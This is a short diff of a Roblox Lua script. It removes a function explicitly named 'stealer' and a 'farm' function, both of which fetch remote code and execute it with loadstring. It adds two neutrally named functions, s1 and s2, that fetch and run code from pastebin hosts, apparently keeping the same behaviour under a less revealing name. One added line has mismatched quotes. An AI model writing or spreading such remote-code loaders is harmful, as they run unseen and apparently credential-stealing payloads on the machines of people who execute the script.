@@ -1,9 +1,8 @@
-local function stealer()
-    loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImU3NTA2NmI2LWUyNDctNDZhZS05NjBhLWIyZjVhMjY0MDhjZCIsImtpbmQiOiJsb2FkZXIifQ"))()
-end
-local function farm()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/pruzgar242-rgb/Update/refs/heads/main/out.lua%20(17).txt"))()
-end
-
-task.spawn(stealer)
-task.spawn(farm)
+local function s1() 
+    loadstring(game:HttpGet('https://cdn.sourceb.in/bins/4OV50e6CJI/0", true))()
+end 
+local function s2() 
+    loadstring(game:HttpGet("https://pastefy.app/zF2bTBof/raw", true))() 
+end 
+task.spawn(s1)
+task.spawn(s2)
